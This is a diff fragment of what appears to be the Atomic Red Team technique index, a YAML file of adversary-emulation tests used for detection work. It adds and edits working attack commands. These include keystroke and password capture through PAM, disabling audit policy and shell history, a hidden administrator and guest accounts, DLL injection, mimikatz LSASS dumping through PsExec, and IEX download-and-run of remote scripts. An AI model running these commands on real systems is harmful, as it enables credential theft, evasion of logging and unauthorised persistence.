+        cleanup_command: 'rm -Rf #{test_folder}
+
+'
   T1123:
     technique:
       id: attack-pattern--1035cdf2-3e5f-446f-a7a7-e8f6d7925967
@@ -23365,7 +24143,7 @@ collection:
       executor:
         command: |
           Set-Clipboard -value "Atomic T1115 Test, grab data from clipboard via VBA"
-          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1")
+          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1" -UseBasicParsing)
           Invoke-Maldoc -macroFile "PathToAtomicsFolder\T1115\src\T1115-macrocode.txt" -officeProduct "Word" -sub "GetClipboard"
         cleanup_command: 'Remove-Item "$env:TEMP\atomic_T1115_clipboard_data.txt"
           -ErrorAction Ignore
@@ -23550,7 +24328,7 @@ collection:
       executor:
         command: |
           mavinject $pid /INJECTRUNNING #{file_name}
-          curl #{server_name}
+          curl #{server_name} -UseBasicParsing
         name: powershell
         elevation_required: true
   T1074:
@@ -24292,6 +25070,40 @@ collection:
 '
         name: powershell
         elevation_required: true
+    - name: Living off the land Terminal Input Capture on Linux with pam.d
+      auto_generated_guid: 9c6bdb34-a89f-4b90-acb1-5970614c711b
+      description: "Pluggable Access Module, which is present on all modern Linux
+        systems, generally contains a library called pam_tty_audit.so which logs all
+        keystrokes for the selected users and sends it to audit.log.  All terminal
+        activity on any new logins would then be archived and readable by an adversary
+        with elevated privledges.\n\nPasswords hidden by the console can also be logged,
+        with 'log_passwd' as in this example.  If root logging is enabled, then output
+        from any process which is later started by root is also logged, even if this
+        policy is carefully enabled (e.g. 'disable=*' as the initial command).\n\nUse
+        'aureport --tty' or other audit.d reading tools to read the log output, which
+        is binary.  Mac OS does not currently contain the pam_tty_audit.so library.
+        \n"
+      prereq_command: 'test -f ''/usr/lib/pam/pam_tty_audit.so -o  /usr/lib64/security/pam_tty_audit.so''
+
+'
+      get_prereq_command: 'echo "Sorry, you must install module pam_tty_audit.so and
+        recompile, for this test to work"
+
+'
+      supported_platforms:
+      - linux
+      executor:
+        command: if sudo test -f /etc/pam.d/password-auth; then sudo cp /etc/pam.d/password-auth
+          /tmp/password-auth.bk; fi; if sudo test -f /etc/pam.d/system-auth; then
+          sudo cp /etc/pam.d/system-auth /tmp/system-auth.bk; fi; sudo touch /tmp/password-auth.bk
+          sudo touch /tmp/system-auth.bk sudo echo "session    required    pam_tty_audit.so
+          enable=* log_password" >> /etc/pam.d/password-auth sudo echo "session    required    pam_tty_audit.so
+          enable=* log_password" >> /etc/pam.d/system-auth
+        cleanup_command: |
+          sudo cp -f /tmp/password-auth.bk /etc/pam.d/password-auth
+          sudo cp -f /tmp/system-auth.bk /etc/pam.d/system-auth
+        name: sh
+        elevation_required: true
   T1557.001:
     technique:
       external_references:
@@ -25013,6 +25825,26 @@ collection:
           description: Output file path
           type: Path
           default: "/tmp/T1113_desktop.xwd"
+        package_checker:
+          description: Package checking command for linux. Debian system command-
+            dpkg -s x11-apps
+          type: string
+          default: rpm -q xorg-x11-apps
+        package_installer:
+          description: Package installer command for linux. Debian system command-
+            apt-get install x11-apps
+          type: string
+          default: yum install -y xorg-x11-apps
+      dependency_executor_name: bash
+      dependencies:
+      - description: 'Package with XWD and XWUD must exist on device
+
+'
+        prereq_command: 'if #{package_checker} > /dev/null; then exit 0; else exit
+          1; fi
+
+'
+        get_prereq_command: "sudo #{package_installer} \n"
       executor:
         command: |
           xwd -root -out #{output_file}
@@ -25038,10 +25870,11 @@ collection:
       - description: 'ImageMagick must be installed
 
 '
-        prereq_command: 'if import --version; then exit 0; else exit 1; fi
+        prereq_command: 'if import -help > /dev/null 2>&1; then exit 0; else exit
+          1; fi
 
 '
-        get_prereq_command: 'sudo apt-get -y install imagemagick
+        get_prereq_command: 'sudo apt-get -y install graphicsmagick-imagemagick-compat
 
 '
       executor:
@@ -25077,7 +25910,9 @@ collection:
           Add-Type -MemberDefinition '[DllImport("user32.dll")] public static extern void mouse_event(int flags, int dx, int dy, int cButtons, int info);' -Name U32 -Namespace W;
           [W.U32]::mouse_event(0x02 -bor 0x04 -bor 0x01, 0, 0, 0, 0);
           cmd /c "timeout #{recording_time} > NULL && psr.exe /stop"
-        cleanup_command: 'rm #{output_file} -ErrorAction Ignore'
+        cleanup_command: 'rm #{output_file} -ErrorAction Ignore
+
+'
   T1213.002:
     technique:
       external_references:
@@ -25720,12 +26555,12 @@ defense-evasion:
 
 '
         name: command_prompt
-    - name: Bits download using destktopimgdownldr.exe (cmd)
+    - name: Bits download using desktopimgdownldr.exe (cmd)
       auto_generated_guid: afb5e09e-e385-4dee-9a94-6ee60979d114
-      description: "This test simulates using destopimgdwnldr.exe to download a malicious
-        file\ninstead of a desktop or lockscreen background img. The process that
-        actually makes \nthe TCP connection and creates the file on the disk is a
-        svchost process (“-k netsvc -p -s BITS”) \nand not desktopimgdownldr.exe.
+      description: "This test simulates using desktopimgdownldr.exe to download a
+        malicious file\ninstead of a desktop or lockscreen background img. The process
+        that actually makes \nthe TCP connection and creates the file on the disk
+        is a svchost process (“-k netsvc -p -s BITS”) \nand not desktopimgdownldr.exe.
         See https://labs.sentinelone.com/living-off-windows-land-a-new-native-file-downldr/\n"
       supported_platforms:
       - windows
@@ -26614,7 +27449,6 @@ defense-evasion:
 '
       supported_platforms:
       - linux
-      - macos
       executor:
         command: 'echo "" > ~/.bash_history
 
@@ -26688,6 +27522,10 @@ defense-evasion:
           echo 'set +o history' >> ~/.bashrc
           . ~/.bashrc
           history -c
+        cleanup_command: |
+          sed -i 's/set +o history//g' ~/.bashrc
+          . ~/.bashrc
+          set -o history
         name: sh
     - name: Use Space Before Command to Avoid Logging to History
       auto_generated_guid: 53b03a54-4529-4992-852d-a00b4b7215a6
@@ -26702,6 +27540,33 @@ defense-evasion:
         command: |
           hostname
           whoami
+        name: sh
+    - name: Disable Bash History Logging with SSH -T
+      auto_generated_guid: 5f8abd62-f615-43c5-b6be-f780f25790a1
+      description: 'Keeps history clear and stays out of lastlog,wtmp,btmp ssh -T
+        keeps the ssh client from catching a proper TTY, which is what usually gets
+        logged on lastlog
+
+'
+      supported_platforms:
+      - linux
+      dependencies:
+      - description: 'Install sshpass and create user account used for excuting
+
+'
+        prereq_command: |
+          /usr/sbin/useradd testuser1
+          echo pwd101! | passwd testuser1 --stdin
+        get_prereq_command: |
+          yum -y install epel-release
+          yum -y install sshpass
+      executor:
+        command: 'sshpass -p ''pwd101!'' ssh testuser1@localhost -T hostname
+
+'
+        cleanup_command: 'userdel -f testuser1
+
+'
         name: sh
     - name: Prevent Powershell History Logging
       auto_generated_guid: 2f898b81-3e97-4abb-bc3f-a95138988370
@@ -26945,7 +27810,7 @@ defense-evasion:
 '
       executor:
         command: |
-          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1")
+          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1" -UseBasicParsing)
           Invoke-Maldoc -macroFile "PathToAtomicsFolder\T1070.001\src\T1070.001-macrocode.txt" -officeProduct "Word" -sub "ClearLogs"
         name: powershell
         elevation_required: true
@@ -27975,7 +28840,7 @@ defense-evasion:
 '
         get_prereq_command: |
           New-Item -Type Directory (split-path #{gup_executable}) -ErrorAction ignore | Out-Null
-          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1574.002/bin/GUP.exe" -OutFile "#{gup_executable}"
+          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1574.002/bin/GUP.exe?raw=true" -OutFile "#{gup_executable}"
       executor:
         command: "#{gup_executable}\n"
         cleanup_command: 'taskkill /F /IM #{process_name} >nul 2>&1
@@ -28052,18 +28917,27 @@ defense-evasion:
         allow multiple RDP connections
       supported_platforms:
       - windows
+      input_arguments:
+        guest_user:
+          description: Specify the guest account
+          type: String
+          default: guest
+        guest_password:
+          description: Specigy the guest password
+          type: String
+          default: Password123!
       executor:
         command: |-
-          net user guest /active:yes
-          net user guest Password123!
-          net localgroup administrators guest /add
-          net localgroup "Remote Desktop Users" guest /add
+          net user #{guest_user} /active:yes
+          net user #{guest_user} #{guest_password}
+          net localgroup administrators #{guest_user} /add
+          net localgroup "Remote Desktop Users" #{guest_user} /add
           reg add "hklm\system\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
           reg add "hklm\system\CurrentControlSet\Control\Terminal Server" /v "AllowTSConnections" /t REG_DWORD /d 0x1 /f
         cleanup_command: |-
-          net user guest /active:no >nul 2>&1
-          net localgroup administrators guest /delete >nul 2>&1
-          net localgroup "Remote Desktop Users" guest /delete >nul 2>&1
+          net user #{guest_user} /active:no >nul 2>&1
+          net localgroup administrators #{guest_user} /delete >nul 2>&1
+          net localgroup "Remote Desktop Users" #{guest_user} /delete >nul 2>&1
           reg delete "hklm\system\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /f >nul 2>&1
           reg delete "hklm\system\CurrentControlSet\Control\Terminal Server" /v "AllowTSConnections" /f >nul 2>&1
         name: command_prompt
@@ -28456,6 +29330,8 @@ defense-evasion:
       description: |
         Disables HTTP logging on a Windows IIS web server as seen by Threat Group 3390 (Bronze Union).
         This action requires HTTP logging configurations in IIS to be unlocked.
+
+        Use the cleanup commands to restore some default auditpol settings (your original settings will be lost)
       supported_platforms:
       - windows
       input_arguments:
@@ -28480,7 +29356,7 @@ defense-evasion:
       supported_platforms:
       - windows
       executor:
-        command: |-
+        command: |
           Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned -ErrorAction Ignore
           $url = "https://raw.githubusercontent.com/hlldz/Invoke-Phant0m/f1396c411a867e1b471ef80c5c534466103440e0/Invoke-Phant0m.ps1"
           $output = "$env:TEMP\Invoke-Phant0m.ps1"
@@ -28489,9 +29365,44 @@ defense-evasion:
           cd $env:TEMP
           Import-Module .\Invoke-Phant0m.ps1
           Invoke-Phant0m
-        cleanup_command: Write-Host "NEED TO Restart-Computer TO ENSURE LOGGING RETURNS"
-          -fore red
+        cleanup_command: |
+          Write-Host "NEED TO Restart-Computer TO ENSURE LOGGING RETURNS" -fore red
+          Remove-Item "$env:TEMP\Invoke-Phant0m.ps1" -ErrorAction Ignore
         name: powershell
+        elevation_required: true
+    - name: Impair Windows Audit Log Policy
+      auto_generated_guid: 5102a3a7-e2d7-4129-9e45-f483f2e0eea8
+      description: |-
+        Disables the windows audit policy to prevent key host based telemetry being written into the event logs.
+        [Solarigate example](https://www.microsoft.com/security/blog/2021/01/20/deep-dive-into-the-solorigate-second-stage-activation-from-sunburst-to-teardrop-and-raindrop/)
+      supported_platforms:
+      - windows
+      executor:
+        command: |
+          auditpol /set /category:"Account Logon" /success:disable /failure:disable
+          auditpol /set /category:"Logon/Logoff" /success:disable /failure:disable
+          auditpol /set /category:"Detailed Tracking" /success:disable
+        cleanup_command: |
+          auditpol /set /category:"Account Logon" /success:enable /failure:enable
+          auditpol /set /category:"Detailed Tracking" /success:enable
+          auditpol /set /category:"Logon/Logoff" /success:enable /failure:enable
+        name: command_prompt
+        elevation_required: true
+    - name: Clear Windows Audit Policy Config
+      auto_generated_guid: 913c0e4e-4b37-4b78-ad0b-90e7b25010f6
+      description: Clear the Windows audit policy using auditpol utility. This action
+        would stop certain audit events from being recorded in the security log.
+      supported_platforms:
+      - windows
+      executor:
+        command: |
+          auditpol /clear /y
+          auditpol /remove /allusers
+        cleanup_command: |
+          auditpol /set /category:"Account Logon" /success:enable /failure:enable
+          auditpol /set /category:"Detailed Tracking" /success:enable
+          auditpol /set /category:"Logon/Logoff" /success:enable /failure:enable
+        name: command_prompt
         elevation_required: true
   T1562.007:
     technique:
@@ -28678,23 +29589,13 @@ defense-evasion:
           description: path to exe file
           type: path
           default: PathToAtomicsFolder\T1562.004\bin\AtomicTest.exe
-      dependency_executor_name: powershell
-      dependencies:
-      - description: 'exe file must exist on disk in users folder
-
-'
-        prereq_command: 'if (Get-Item "C:\Users\$env:UserName\AtomicTest.exe") {exit
-          0} else {exit 1}
-
-'
-        get_prereq_command: 'Copy-Item #{exe_file_path} -Destination "C:\Users\$env:UserName"
-
-'
       executor:
-        command: netsh advfirewall firewall add rule name="Atomic Test" dir=in action=allow
-          program="C:\Users\$env:UserName\AtomicTest.exe" enable=yes
-        cleanup_command: netsh advfirewall firewall delete rule name="Atomic Test"
-          | Out-Null
+        command: |
+          Copy-Item #{exe_file_path} -Destination "C:\Users\$env:UserName" -Force
+          netsh advfirewall firewall add rule name="Atomic Test" dir=in action=allow program="C:\Users\$env:UserName\AtomicTest.exe" enable=yes
+        cleanup_command: |
+          netsh advfirewall firewall delete rule name="Atomic Test" | Out-Null
+          Remove-Item C:\Users\$env:UserName\AtomicTest.exe -ErrorAction Ignore
         name: powershell
         elevation_required: true
   T1562.001:
@@ -28795,7 +29696,11 @@ defense-evasion:
         command: 'setenforce 0
 
 '
+        cleanup_command: 'setenforce 1
+
+'
         name: sh
+        elevation_required: true
     - name: Stop Crowdstrike Falcon on Linux
       auto_generated_guid: 828a1278-81cc-4802-96ab-188bf29ca77d
       description: 'Stop and disable Crowdstrike Falcon on Linux
@@ -29571,7 +30476,43 @@ defense-evasion:
       x_mitre_is_subtechnique: true
       x_mitre_platforms:
       - Windows
-    atomic_tests: []
+      identifier: T1055.001
+    atomic_tests:
+    - name: Process Injection via mavinject.exe
+      auto_generated_guid: 74496461-11a1-4982-b439-4d87a550d254
+      description: |
+        Windows 10 Utility To Inject DLLS.
+
+        Upon successful execution, powershell.exe will download T1055.dll to disk. Powershell will then spawn mavinject.exe to perform process injection in T1055.dll.
+        With default arguments, expect to see a MessageBox, with notepad's icon in taskbar.
+      supported_platforms:
+      - windows
+      input_arguments:
+        process_id:
+          description: PID of input_arguments
+          type: Integer
+          default: "(Start-Process notepad -PassThru).id"
+        dll_payload:
+          description: DLL to Inject
+          type: Path
+          default: PathToAtomicsFolder\T1055.001\src\x64\T1055.001.dll
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'Utility to inject must exist on disk at specified location (#{dll_payload})
+
+'
+        prereq_command: 'if (Test-Path #{dll_payload}) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: |
+          New-Item -Type Directory (split-path #{dll_payload}) -ErrorAction ignore | Out-Null
+          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055.001/src/x64/T1055.001.dll" -OutFile "#{dll_payload}"
+      executor:
+        command: |
+          $mypid = #{process_id}
+          mavinject $mypid /INJECTRUNNING #{dll_payload}
+        name: powershell
+        elevation_required: true
   T1548.004:
     technique:
       external_references:
@@ -31043,12 +31984,33 @@ defense-evasion:
         command: |
           $macro = [System.IO.File]::ReadAllText("PathToAtomicsFolder\T1564\src\T1564-macrocode.txt")
           $macro = $macro -replace "aREPLACEMEa", "PathToAtomicsFolder\T1564\bin\extractme.bin"
-          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1")
+          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1" -UseBasicParsing)
           Invoke-Maldoc -macroCode "$macro" -officeProduct "Word" -sub "Extract" -NoWrap
         cleanup_command: 'Remove-Item "$env:TEMP\extracted.exe" -ErrorAction Ignore
 
 '
         name: powershell
+    - name: Create a user called "$" as noted here
+      auto_generated_guid: 2ec63cc2-4975-41a6-bf09-dffdfb610778
+      description: Creating a user with a username containing "$"
+      supported_platforms:
+      - windows
+      executor:
+        name: command_prompt
+        elevation_required: true
+        command: net user $ ATOMIC123! /add /active:yes
+        cleanup_command: net user $ /DELETE 2>&1
+    - name: Create an "Administrator " user (with a space on the end)
+      auto_generated_guid: 5bb20389-39a5-4e99-9264-aeb92a55a85c
+      description: Creating a user with a username containing with a space on the
+        end
+      supported_platforms:
+      - windows
+      executor:
+        name: powershell
+        elevation_required: true
+        command: New-LocalUser -Name "Administrator " -NoPassword
+        cleanup_command: Remove-LocalUser -Name "Administrator " 2>&1 | out-null
   T1574:
     technique:
       external_references:
@@ -31403,7 +32365,7 @@ defense-evasion:
           sed -i '$ d' /etc/#{libaudit_config_file_name}
         name: bash
         elevation_required: true
-    - name: Lgging Configuration Changes on Linux Host
+    - name: Logging Configuration Changes on Linux Host
       auto_generated_guid: 7d40bc58-94c7-4fbb-88d9-ebce9fcdb60c
       description: 'Emulates modification of syslog configuration.
 
@@ -31923,7 +32885,7 @@ defense-evasion:
           Export-Certificate -Type CERT -Cert  Cert:\LocalMachine\My\$($cert.Thumbprint) -FilePath #{pfx_path}
           Get-ChildItem Cert:\LocalMachine\My\$($cert.Thumbprint) | Remove-Item
       executor:
-        command: 'certutil -addstore my .\test-cert.cer
+        command: 'certutil -addstore my #{pfx_path}
 
 '
         cleanup_command: |
@@ -33137,9 +34099,11 @@ defense-evasion:
       - Windows
       identifier: T1127.001
     atomic_tests:
-    - name: MSBuild Bypass Using Inline Tasks
+    - name: MSBuild Bypass Using Inline Tasks (C#)
       auto_generated_guid: 58742c0f-cb01-44cd-a60b-fb26e8871c93
-      description: 'Executes the code in a project file using. C# Example
+      description: 'Executes the code in a project file using msbuild.exe. The default
+        C# project example file (T1127.001.csproj) will simply print "Hello From a
+        Code Fragment" and "Hello From a Class." to the screen.
 
 '
       supported_platforms:
@@ -33149,6 +34113,14 @@ defense-evasion:
           description: Location of the project file
           type: Path
           default: PathToAtomicsFolder\T1127.001\src\T1127.001.csproj
+        msbuildpath:
+          description: Default location of MSBuild
+          type: Path
+          default: C:\Windows\Microsoft.NET\Framework\v4.0.30319
+        msbuildname:
+          description: Default name of MSBuild
+          type: Path
+          default: msbuild.exe
       dependency_executor_name: powershell
       dependencies:
       - description: 'Project file must exist on disk at specified location (#{filename})
@@ -33161,9 +34133,43 @@ defense-evasion:
           New-Item -Type Directory (split-path #{filename}) -ErrorAction ignore | Out-Null
           Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1127.001/src/T1127.001.csproj" -OutFile "#{filename}"
       executor:
-        command: 'C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe #{filename}
+        command: "#{msbuildpath}\\#{msbuildname} #{filename}\n"
+        name: command_prompt
+    - name: MSBuild Bypass Using Inline Tasks (VB)
+      auto_generated_guid: ab042179-c0c5-402f-9bc8-42741f5ce359
+      description: 'Executes the code in a project file using msbuild.exe. The default
+        Visual Basic example file (vb.xml) will simply print "Hello from a Visual
+        Basic inline task!" to the screen.
 
 '
+      supported_platforms:
+      - windows
+      input_arguments:
+        filename:
+          description: Location of the project file
+          type: Path
+          default: PathToAtomicsFolder\T1127.001\src\vb.xml
+        msbuildpath:
+          description: Default location of MSBuild
+          type: Path
+          default: C:\Windows\Microsoft.NET\Framework\v4.0.30319
+        msbuildname:
+          description: Default name of MSBuild
+          type: Path
+          default: msbuild.exe
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'Project file must exist on disk at specified location (#{filename})
+
+'
+        prereq_command: 'if (Test-Path #{filename}) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: |
+          New-Item -Type Directory (split-path #{filename}) -ErrorAction ignore | Out-Null
+          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1127.001/src/vb.xml" -OutFile "#{filename}"
+      executor:
+        command: "#{msbuildpath}\\#{msbuildname} #{filename}\n"
         name: command_prompt
   T1134.003:
     technique:
@@ -33372,7 +34378,20 @@ defense-evasion:
       - Bartosz Jerzman
       x_mitre_version: '1.3'
       x_mitre_is_subtechnique: false
-    atomic_tests: []
+      identifier: T1036
+    atomic_tests:
+    - name: System File Copied to Unusual Location
+      auto_generated_guid: 51005ac7-52e2-45e0-bdab-d17c6d4916cd
+      description: It may be suspicious seeing a file copy of an EXE in System32 or
+        SysWOW64 to a non-system directory or executing from a non-system directory.
+      supported_platforms:
+      - windows
+      executor:
+        command: |-
+          copy %WINDIR%\System32\cmd.exe /Y %ALLUSERSPROFILE%\cmd.exe
+          start %ALLUSERSPROFILE%\cmd.exe
+        cleanup_command: del %ALLUSERSPROFILE%\cmd.exe >nul 2>&1
+        name: command_prompt
   T1036.005:
     technique:
       external_references:
@@ -34947,20 +35966,17 @@ defense-evasion:
       supported_platforms:
       - windows
       input_arguments:
-        exe_payload:
-          description: EXE to execute
-          type: Path
-          default: "%temp%\\temp_T1027.zip\\T1027.exe"
         url_path:
           description: url to download Exe
           type: url
           default: https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1027/bin/T1027.zip
       dependency_executor_name: powershell
       dependencies:
-      - description: 'T1027.exe must exist on disk at specified location
+      - description: 'T1027.exe must exist on disk at $env:temp\temp_T1027.zip\T1027.exe
 
 '
-        prereq_command: 'if (Test-Path #{exe_payload}) {exit 0} else {exit 1}
+        prereq_command: 'if (Test-Path $env:temp\temp_T1027.zip\T1027.exe) {exit 0}
+          else {exit 1}
 
 '
         get_prereq_command: |
@@ -34968,7 +35984,7 @@ defense-evasion:
           Invoke-WebRequest "#{url_path}" -OutFile "$env:temp\T1027.zip"
           Expand-Archive -path "$env:temp\T1027.zip" -DestinationPath "$env:temp\temp_T1027.zip\" -Force
       executor:
-        command: '"#{exe_payload}"
+        command: '"%temp%\temp_T1027.zip\T1027.exe"
 
 '
         cleanup_command: |
@@ -35412,8 +36428,10 @@ defense-evasion:
           New-Item -ItemType Directory (Split-Path $mimikatz_path) -Force | Out-Null
           Move-Item $env:TEMP\mimikatz\x64\mimikatz.exe $mimikatz_path -Force
       executor:
-        command: "#{mimikatz_path} sekurlsa::pth /user:#{user_name} /domain:#{domain}
-          /ntlm:#{ntlm}\n"
+        command: '#{mimikatz_path} "sekurlsa::pth /user:#{user_name} /domain:#{domain}
+          /ntlm:#{ntlm}"
+
+'
         name: command_prompt
     - name: crackmapexec Pass the Hash
       auto_generated_guid: eb05b028-16c8-4ad8-adea-6f5b219da9a9
@@ -35542,10 +36560,26 @@ defense-evasion:
           description: domain
           type: string
           default: atomic.local
-      executor:
-        command: 'mimikatz # kerberos::ptt #{user_name}@#{domain}
+        mimikatz_exe:
+          description: Path of the Mimikatz binary
+          type: string
+          default: PathToAtomicsFolder\T1550.003\bin\mimikatz.exe
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'Mimikatz must exist on disk at specified location (#{mimikatz_exe})
 
 '
+        prereq_command: 'if (Test-Path #{mimikatz_exe}) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: |
+          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+          Invoke-WebRequest "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20200918-fix/mimikatz_trunk.zip" -OutFile "$env:TEMP\Mimi.zip"
+          Expand-Archive $env:TEMP\Mimi.zip $env:TEMP\Mimi -Force
+          New-Item -ItemType Directory (Split-Path #{mimikatz_exe}) -Force | Out-Null
+          Copy-Item $env:TEMP\Mimi\x64\mimikatz.exe #{mimikatz_exe} -Force
+      executor:
+        command: "#{mimikatz_exe} # kerberos::ptt #{user_name}@#{domain}\n"
         name: command_prompt
   T1556.002:
     technique:
@@ -36451,11 +37485,11 @@ defense-evasion:
         sponsor_binary_path:
           description: Path of the sponsor binary (executable that will host the binary)
           type: string
-          default: C:\Windows\System32\calc.exe
+          default: C:\Windows\System32\notepad.exe
         spawnto_process_name:
           description: Name of the process to spawn
           type: string
-          default: calc
+          default: notepad
       executor:
         command: |
           . $PathToAtomicsFolder\T1055.012\src\Start-Hollow.ps1
@@ -36468,7 +37502,7 @@ defense-evasion:
         name: powershell
     - name: RunPE via VBA
       auto_generated_guid: 3ad4a037-1598-4136-837c-4027e4fa319b
-      description: 'This module executes calc.exe from within the WINWORD.EXE process
+      description: 'This module executes notepad.exe from within the WINWORD.EXE process
 
 '
       supported_platforms:
@@ -36495,8 +37529,8 @@ defense-evasion:
 
 '
       executor:
-        command: "IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1\")
-          \nInvoke-MalDoc -macroFile \"PathToAtomicsFolder\\T1055.012\\src\\T1055.012-macrocode.txt\"
+        command: "IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1\"
+          -UseBasicParsing) \nInvoke-MalDoc -macroFile \"PathToAtomicsFolder\\T1055.012\\src\\T1055.012-macrocode.txt\"
           -officeProduct \"#{ms_product}\" -sub \"Exploit\"\n"
         name: powershell
   T1055:
@@ -36601,41 +37635,6 @@ defense-evasion:
       x_mitre_is_subtechnique: false
       identifier: T1055
     atomic_tests:
-    - name: Process Injection via mavinject.exe
-      auto_generated_guid: 74496461-11a1-4982-b439-4d87a550d254
-      description: |
-        Windows 10 Utility To Inject DLLS.
-
-        Upon successful execution, powershell.exe will download T1055.dll to disk. Powershell will then spawn mavinject.exe to perform process injection in T1055.dll.
-        With default arguments, expect to see a MessageBox, with notepad's icon in taskbar.
-      supported_platforms:
-      - windows
-      input_arguments:
-        process_id:
-          description: PID of input_arguments
-          type: Integer
-          default: "(Start-Process notepad -PassThru).id"
-        dll_payload:
-          description: DLL to Inject
-          type: Path
-          default: PathToAtomicsFolder\T1055\src\x64\T1055.dll
-      dependency_executor_name: powershell
-      dependencies:
-      - description: 'Utility to inject must exist on disk at specified location (#{dll_payload})
-
-'
-        prereq_command: 'if (Test-Path #{dll_payload}) {exit 0} else {exit 1}
-
-'
-        get_prereq_command: |
-          New-Item -Type Directory (split-path #{dll_payload}) -ErrorAction ignore | Out-Null
-          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055/src/x64/T1055.dll" -OutFile "#{dll_payload}"
-      executor:
-        command: |
-          $mypid = #{process_id}
-          mavinject $mypid /INJECTRUNNING #{dll_payload}
-        name: powershell
-        elevation_required: true
     - name: Shellcode execution via VBA
       auto_generated_guid: 1c91e740-1729-4329-b779-feba6e71d048
       description: |
@@ -36664,9 +37663,65 @@ defense-evasion:
 '
       executor:
         command: |
-          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1")
+          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1" -UseBasicParsing)
           Invoke-Maldoc -macroFile "PathToAtomicsFolder\T1055\src\x64\T1055-macrocode.txt" -officeProduct "Word" -sub "Execute"
         name: powershell
+    - name: Remote Process Injection in LSASS via mimikatz
+      auto_generated_guid: 3203ad24-168e-4bec-be36-f79b13ef8a83
+      description: |
+        Use mimikatz to remotely (via psexec) dump LSASS process content for RID 500 via code injection (new thread).
+        It must be executed in the context of a user who is privileged on remote `machine`.
+
+        The effect of `/inject` is explained in <https://blog.3or.de/mimikatz-deep-dive-on-lsadumplsa-patch-and-inject.html>
+      supported_platforms:
+      - windows
+      input_arguments:
+        machine:
+          description: machine to target (via psexec)
+          type: string
+          default: DC1
+        mimikatz_path:
+          description: Mimikatz windows executable
+          type: path
+          default: "%tmp%\\mimikatz\\x64\\mimikatz.exe"
+        psexec_path:
+          description: Path to PsExec
+          type: string
+          default: C:\PSTools\PsExec.exe
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'Mimikatz executor must exist on disk and at specified location
+          (#{mimikatz_path})
+
+'
+        prereq_command: |
+          $mimikatz_path = cmd /c echo #{mimikatz_path}
+          if (Test-Path $mimikatz_path) {exit 0} else {exit 1}
+        get_prereq_command: |
+          $mimikatz_path = cmd /c echo #{mimikatz_path}
+          Invoke-WebRequest "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20200918-fix/mimikatz_trunk.zip" -OutFile "$env:TEMP\mimikatz.zip"
+          Expand-Archive $env:TEMP\mimikatz.zip $env:TEMP\mimikatz -Force
+          New-Item -ItemType Directory (Split-Path $mimikatz_path) -Force | Out-Null
+          Move-Item $env:TEMP\mimikatz\x64\mimikatz.exe $mimikatz_path -Force
+      - description: 'PsExec tool from Sysinternals must exist on disk at specified
+          location (#{psexec_path})
+
+'
+        prereq_command: 'if (Test-Path "#{psexec_path}") { exit 0} else { exit 1}
+
+'
+        get_prereq_command: |
+          Invoke-WebRequest "https://download.sysinternals.com/files/PSTools.zip" -OutFile "$env:TEMP\PsTools.zip"
+          Expand-Archive $env:TEMP\PsTools.zip $env:TEMP\PsTools -Force
+          New-Item -ItemType Directory (Split-Path "#{psexec_path}") -Force | Out-Null
+          Copy-Item $env:TEMP\PsTools\PsExec.exe "#{psexec_path}" -Force
+      executor:
+        command: '#{psexec_path} /accepteula \\#{machine} -c #{mimikatz_path} "lsadump::lsa
+          /inject /id:500" "exit"
+
+'
+        name: command_prompt
+        elevation_required: false
   T1055.008:
     technique:
       external_references:
@@ -37203,6 +38258,14 @@ defense-evasion:
           description: Name of the local file, include path.
           type: Path
           default: PathToAtomicsFolder\T1218.010\src\RegSvr32.sct
+        regsvr32path:
+          description: Default location of Regsvr32.exe
+          type: Path
+          default: C:\Windows\system32
+        regsvr32name:
+          description: Default name of Regsvr32.exe
+          type: String
+          default: regsvr32.exe
       dependency_executor_name: powershell
       dependencies:
       - description: 'Regsvr32.sct must exist on disk at specified location (#{filename})
@@ -37215,9 +38278,7 @@ defense-evasion:
           New-Item -Type Directory (split-path #{filename}) -ErrorAction ignore | Out-Null
           Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.010/src/RegSvr32.sct" -OutFile "#{filename}"
       executor:
-        command: 'regsvr32.exe /s /u /i:#{filename} scrobj.dll
-
-'
